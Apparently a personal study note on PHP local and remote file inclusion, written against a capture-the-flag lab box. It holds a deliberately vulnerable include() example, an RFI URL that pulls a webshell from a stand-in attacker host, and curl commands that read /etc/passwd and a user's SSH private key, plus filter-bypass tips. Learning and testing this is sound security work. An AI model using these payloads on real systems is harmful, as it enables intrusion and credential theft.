# fileInclusion
* is caused when an application builds a path to executable code using an
  attacker-controlled variable in a way that allows the attacker to
  control which file is executed.
  * remote file inclusion
  * local file inclusion (including local files)

  see [this](https:
  //www.blackhatethicalhacking.com/articles/exploiting-lfi-vulnerabilities/)

* php: use of unvalidated user-input with a file system function that includes
  a file for execution, like include and require.

  `php
  <?php
  if (isset($_GET['language'])) {
      include($_GET['language'] . '.php');
  }
  ?>
  `

  `html
  <form method="get">
     <select name="language">
        <option value="english">English</option>
        <option value="french">French</option>
        ...
     </select>
     <input type="submit">
  </form>
  `

  `/vulnerable.php?language=http://evil.example.com/webshell.txt?`

* find a script (like evil.php, fuzz it to find parameters):
  `http://evilbox/secret/evil.php?FUZZ=/etc/passwd`
* check if it's vulnerable `curl http://evilbox/secret/evil.php?command=/etc/passwd`
* why adding "../" doesn't work but "/../" does? it adds a prefix to the
  path, so we have to bypass it by adding a "/" after the prefix (start
  of out path) so it considers the prefix as a directory.

* you can access files in a user directory like this:
`curl http://evilbox/secret/evil.php?command=/home/mowree/.ssh/id_rsa`

* use encoding to bypass filters.
